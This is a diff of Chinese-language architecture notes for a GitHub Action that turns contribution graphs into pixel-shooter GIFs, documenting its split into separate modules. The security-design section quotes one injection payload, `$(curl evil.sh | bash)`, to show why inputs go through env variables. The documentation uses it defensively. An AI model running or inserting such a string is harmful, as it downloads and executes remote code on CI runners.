@@ -6,9 +6,16 @@
 
 | 文件 | 行数 | 角色 | 对外暴露面 | 可否独立执行 |
 |------|------|------|------------------|-------------|
-| `gh_pixel_pulverizer/__init__.py` | 3 | 包标记 + **版本号唯一来源** | `__version__` | 否 |
+| `gh_pixel_pulverizer/__init__.py` | 44 | 包标记 + **版本号唯一来源** + **公共 API 统一导出** | `__version__` + 全部公共符号 | 否 |
 | `gh_pixel_pulverizer/__main__.py` | 4 | `python -m` 入口 | — | 是（`python -m gh_pixel_pulverizer`） |
-| `gh_pixel_pulverizer/cli.py` | 868 | **全部业务逻辑**：常量、模型、引擎、渲染、编码、CLI | 见 [03](./03-api-reference.md) | **是**（`python cli.py ...`） |
+| `gh_pixel_pulverizer/cli.py` | 105 | **只做胶水**：argparse + 串流程 + 写 `$GITHUB_OUTPUT` | `main()` / `build_parser()` | 否（用 `python -m`） |
+| `gh_pixel_pulverizer/config.py` | 119 | 纯常量：调色板 / 几何 / 可调参数 | 见 [03](./03-api-reference.md) §1 | 否 |
+| `gh_pixel_pulverizer/models.py` | 92 | 7 个 `@dataclass` + `Strategy` 枚举 | 见 [03](./03-api-reference.md) §2 | 否 |
+| `gh_pixel_pulverizer/font.py` | 123 | 自绘 5×7 点阵字体（HUD 用） | `draw_text()` / `text_width()` | 否 |
+| `gh_pixel_pulverizer/data.py` | 101 | GraphQL 抓取 + 离线假数据 | `fetch_contributions()` / `generate_dummy()` | 否 |
+| `gh_pixel_pulverizer/engine.py` | 391 | 玩法逻辑：状态机 / 更新 / 碰撞 / 主循环 | `Engine` | 否 |
+| `gh_pixel_pulverizer/render.py` | 280 | 画面：`Renderer`（只读消费 Engine 状态）+ 飞船 sprite + 静态棋盘底 | `Renderer` | 否 |
+| `gh_pixel_pulverizer/gif.py` | 69 | 编码：共享调色板 + 逐帧量化 | `build_palette()` / `quantize_frame()` / `encode_gif()` | 否 |
 | `tests/test_smoke.py` | 184 | 离线冒烟测试（18 例） | — | 是（`python tests/test_smoke.py`） |
 | `action.yml` | 150 | GitHub **Composite Action** 定义 | 11 个 inputs / 3 个 outputs | 由 workflow `uses:` 调用 |
 | `.github/workflows/ci.yml` | 52 | 本仓库自身的 CI | artifact `game-gif-py*` | 由 GitHub 触发 |
@@ -19,15 +26,15 @@
 
 ## 2. `gh_pixel_pulverizer/__init__.py`
 
-```python
-"""gh-pixel-pulverizer: 把 GitHub 贡献图炸成像素 GIF 💥"""
+两个职责：
 
-__version__ = "0.2.0"
-```
-
-职责单一：**作为版本号的唯一来源**。`pyproject.toml` 通过
+1. **作为版本号的唯一来源** —— `__version__ = "0.2.0"`。`pyproject.toml` 通过
 `[tool.setuptools.dynamic] version = {attr = "gh_pixel_pulverizer.__version__"}` 读取，
 避免在 `pyproject.toml` 与代码里两处维护、容易漂移。
+
+2. **统一导出公共 API** —— 把 7 个模块的公共符号 re-export 到包根，
+   外部只需要 `from gh_pixel_pulverizer import Engine`，不必知道内部文件划分。
+   （`cli.py` 也保留了一组旧导入路径，保障 `from gh_pixel_pulverizer.cli import X` 不破。）
 
 > 发版流程：只改这一行的 `__version__`，无需触碰 `pyproject.toml`。
 
@@ -47,45 +54,85 @@ if __name__ == "__main__":
 
 ---
 
-## 4. `gh_pixel_pulverizer/cli.py` —— 核心
+## 4. 业务模块
 
-虽然只有一个文件，但内部组织清晰，按注释分隔线可分成 **7 个逻辑区块**：
+### 4.1 `config.py` —— 纯常量（依赖图的叶子）
 
-| 区块 | 行号区间 | 内容 | 依赖 |
-|------|----------|------|------|
-| ① 调色板常量 | `36-55` | 颜色 RGB 元组（背景、5 级绿、飞船、BOSS、子弹、星空、粒子、HUD） | 无 |
-| ② 尺寸/可调参数 | `58-101` | 画布几何、`STAR_SPEEDS`、`DEFAULT_COLORS`、`TARGET_LOCK_FRAMES`、`BULLET_PIERCE`、`SHIP_TRACK` | 无 |
-| ③ 数据结构 | `104-171` | 6 个 `@dataclass` + `Strategy` 枚举 | dataclasses / enum |
-| ④ GitHub GraphQL | `174-258` | `GRAPHQL` 查询串、`fetch_contributions()`、`generate_dummy()` | json / urllib / zlib / random |
-| ⑤ `Engine` | `261-748` | 初始化 + 更新 + 绘制 + 主循环 | PIL / math / bisect / random |
-| ⑥ GIF 编码 | `751-804` | `_clamp_colors`、`build_palette`、`quantize_frame`、`encode_gif` | PIL / os |
-| ⑦ CLI | `807-868` | `main(argv)` argparse + 编排 | argparse / os |
+调色板（`BG` / `GR_L1..L5` / `SHIP_*` / `STARS` / `PARTICLES` / `HUD*`）、画布几何
+（`CELL` / `COLS` / `WIDTH` / `GRID_TOP` / `SHIP_Y`）、可调参数
+（`DEFAULT_FPS` / `DEFAULT_COLORS` / `BULLET_PIERCE` / `TARGET_LOCK_FRAMES` / `SHIP_TRACK` /
+`BULLET_TRAIL_*`），外加颜色工具 `_rgba()`。
 
-### 4.1 区块内部的调用关系
+**不 import 任何包内模块** —— 谁都可以安全地 import 它，不会有循环。
+
+### 4.2 `models.py` —— 数据结构
+
+`Target` / `Enemy` / `Bullet` / `Particle` / `Star` / `Contributions` 六个 `@dataclass`
++ `Strategy` 枚举。只有 `Target` 带三个派生属性（`cx` / `cy` / `rect()`），
+不含任何更新或绘制逻辑。
+
+### 4.3 `data.py` —— 数据来源
+
+`GRAPHQL` 查询串、`fetch_contributions()`、`generate_dummy()`。
+唯一网络出口；**任何失败都返回 `None`**，由 `cli.main()` 兜底到假数据。
+
+### 4.4 `engine.py` —— 玩法逻辑
+
+`Engine`：构建靶子 / 撒星星 / 每帧更新 / 开火 / 碰撞 / 爆炸 / 回收 / 主循环。
+**一行 PIL 都不 import**，绘制全部委托给 `self.renderer`（`Renderer` 实例，构造时传入 `self`）。
+
+### 4.5 `render.py` —— 绘制层
+
+`Renderer(game)` 持有 Engine 引用，**只读**地取状态来画，从不修改游戏状态。
+对外只有一个入口 `render(celebration=False)`，内部 8 个 `_draw_*` 按 z-order 依次落笔。
+
+### 4.6 `gif.py` —— 编码
+
+`_clamp_colors()` / `build_palette()` / `quantize_frame()` / `encode_gif()`。
+体积相关的两个决策（关抖动、不指定 `disposal=2`）都在这里。
+
+### 4.7 `font.py` —— 点阵字体
+
+5×7 的 `GLYPHS` 表 + `draw_text()` / `text_width()`。为什么不用
+`ImageFont.load_default()`：那个位图字体字形发虚、字宽不齐，右对齐只能靠
+`len(name) * 6` 硬猜（用户名一长就飘出画布）。点阵字体每字固定 6px 步进，
+`text_width()` 能精确算宽；`draw_text()` 把亮像素攒成一次 `d.point()`，
+几十个字符也只有几十次绘制调用。
+
+### 4.8 `cli.py` —— 胶水
+
+`build_parser()` + `main()`：解析参数 → 取数据 → 建 Engine → 编码 → 写 `$GITHUB_OUTPUT`。
+除此之外还 re-export 了一组旧符号（常量 / `Contributions` / `build_palette` / `quantize_frame`），
+保证历史的 `from gh_pixel_pulverizer.cli import ...` 不破。
+
+### 4.9 模块内部的调用关系
 
 ```
-⑤ Engine
-  ├── __init__ ──▶ _build_targets   （③ Target）
-  │            └──▶ _spawn_stars    （③ Star）
+Engine (engine.py)
+  ├── __init__ ──▶ _build_targets   （models.Target）
+  │            ├──▶ _spawn_stars    （models.Star）
+  │            └──▶ Renderer(self)  （render.py）
   ├── 每帧更新：_update_stars / _update_ship / _fire /
   │             _update_bullets / _update_enemies / _update_particles
-  ├── _pick_target  （④ Strategy）
-  ├── _collide ────▶ _explode       （③ Particle / Enemy）
+  ├── _pick_target  （models.Strategy）
+  ├── _collide ────▶ _explode       （models.Particle / Enemy）
   ├── _prune
-  └── 绘制：_draw_grid_bg / _draw_stars / _draw_targets / _draw_enemies /
+  └── _render_frame ──▶ Renderer.render()
+        └── _draw_grid_bg / _draw_stars / _draw_targets / _draw_enemies /
             _draw_bullets / _draw_ship / _draw_particles / _draw_hud
-       └── 汇总为 _render_frame ──▶ iter_frames ──▶ run
+      ▲
+      └── 被 iter_frames 逐帧 yield ──▶ run（兼容旧接口）
 
-⑦ main ──▶ ④ fetch_contributions 或 generate_dummy
-       ──▶ ⑤ Engine(contrib, ...)
-       ──▶ ⑥ encode_gif(engine.iter_frames(), ...)
-       ──▶ 写 $GITHUB_OUTPUT
+main (cli.py) ──▶ fetch_contributions 或 generate_dummy   （data.py）
+             ──▶ Engine(contrib, ...)                     （engine.py）
+             ──▶ encode_gif(engine.iter_frames(), ...)    （gif.py）
+             ──▶ 写 $GITHUB_OUTPUT
 ```
 
-### 4.2 私有方法命名约定
+### 4.10 私有方法命名约定
 
-- `_update_*`：推进物理/逻辑，**有副作用**，不绘制。
-- `_draw_*`：只读当前状态，向 `ImageDraw` 写入，**不改变**游戏状态。
+- `_update_*`（`engine.py`）：推进物理/逻辑，**有副作用**，不绘制。
+- `_draw_*`（`render.py`）：只读当前状态，向 `ImageDraw` 写入，**不改变**游戏状态。
 - `_pick_*` / `_auto_*`：纯策略计算。
 - `_prune`：内存回收。
 - 公开成员（`targets`、`score`、`defeated`、`total_targets`、`frame`）供测试与外部读取。
@@ -113,7 +160,7 @@ if __name__ == "__main__":
 | `username` | `""`（空则取仓库 owner） | 位置参数 `${{ inputs.username \|\| github.repository_owner }}` |
 | `output-path` | `game.gif` | `-o` |
 | `strategy` | `random` | `-s` |
-| `fps` | `40` | `--fps` |
+| `fps` | `20` | `--fps` |
 | `max-frame` | `0`（自动） | `--max-frame` |
 | `boss-chance` | `0.18` | `--boss-chance` |
 | `colors` | `32` | `--colors` |
@@ -124,7 +171,7 @@ if __name__ == "__main__":
 ### 5.3 outputs
 
 `steps.generate.outputs.{output,frames,score}` —— 由 `main()` 写入 `$GITHUB_OUTPUT`
-（`cli.py:860-864`）后由 GitHub 自动提升为 step outputs。
+（`cli.py`）后由 GitHub 自动提升为 step outputs。
 > 注意 `main()` 还会多写一行 `username=`，但 `action.yml` 只声明了 3 个 output。
 
 ### 5.4 安全设计（**不可退让**）
@@ -135,11 +182,11 @@ env:
   INPUT_USERNAME: ${{ inputs.username || github.repository_owner }}
   ...
 run: |
-  python3 gh_pixel_pulverizer/cli.py "${INPUT_USERNAME}" ...
+  python3 -m gh_pixel_pulverizer "${INPUT_USERNAME}" ...
 ```
 
 **所有用户可控值一律经 `env:` 传递，再在脚本里以 `"$VAR"` 引用**。
-若直接写成 `run: python cli.py "${{ inputs.username }}"`，攻击者只需在 issue/workflow 输入里
+若直接写成 `run: python -m gh_pixel_pulverizer "${{ inputs.username }}"`，攻击者只需在 issue/workflow 输入里
 填 `$(curl evil.sh | bash)` 就能在 runner 上执行任意命令。这是历史提交 `94f4237` 修复的问题。
 
 ### 5.5 Step ③ 的提交策略
@@ -204,19 +251,35 @@ else                                       → 新建 commit "💥 pixel-pulveri
                      ┌────────────────────┐
                      │  tests/test_smoke  │
                      └─────────┬──────────┘
-                               │ from gh_pixel_pulverizer.cli import (...)
+                               │ from gh_pixel_pulverizer import (...)
                                ▼
       ┌──────────────┐   ┌─────────────────────┐
       │ __main__.py  │──▶│       cli.py        │
       └──────────────┘   └──────────┬──────────┘
-                                    │ PIL.Image / PIL.ImageDraw / PIL.ImageFont
-                                    ▼
-                              ┌──────────┐
-                              │  pillow  │
-                              └──────────┘
+                                    │
+        ┌───────────────┬───────────┼─────────────┬──────────────┐
+        ▼               ▼           ▼             ▼              ▼
+   ┌─────────┐    ┌──────────┐ ┌─────────┐  ┌─────────┐   ┌──────────┐
+   │ data.py │    │ engine.py│ │ gif.py  │  │ models  │   │ config.py│
+   └────┬────┘    └────┬─────┘ └────┬────┘  └────┬────┘   └────▲─────┘
+        │              │            │            │             │
+        │              ▼            │            │             │
+        │        ┌───────────┐      │            │             │
+        │        │ render.py │──────┼────────────┴─────────────┘
+        │        └─────┬─────┘      │
+        │              │ PIL        │ PIL
+        └──────────────┼────────────┘
+                       ▼
+                 ┌──────────┐
+                 │  pillow  │
+                 └──────────┘
 
    __init__.py ← 被 pyproject.toml 的 dynamic.version 读取（构建期）
-   __init__.py ← 被 tests 隐式导入（因为 import 包才会执行 __init__）
+   __init__.py ← 把上面 6 个模块的公共符号 re-export 到包根
 ```
 
-**没有循环依赖**，`cli.py` 不 import 同包任何模块 —— 这是它能被 `curl` 下来单文件运行的前提。
+**没有循环依赖**：箭头一律指向下（基础）层。`config.py` 是依赖图的叶子，谁都能 import；
+`render.py` 只在 `TYPE_CHECKING` 下引用 `Engine`（拿类型注解），运行时不 import `engine.py`，
+因此 `engine → render` 这条边不会成环。
+
+**唯一外部依赖仍是 pillow**，且只有 `render.py` 与 `gif.py` 会 import 它。
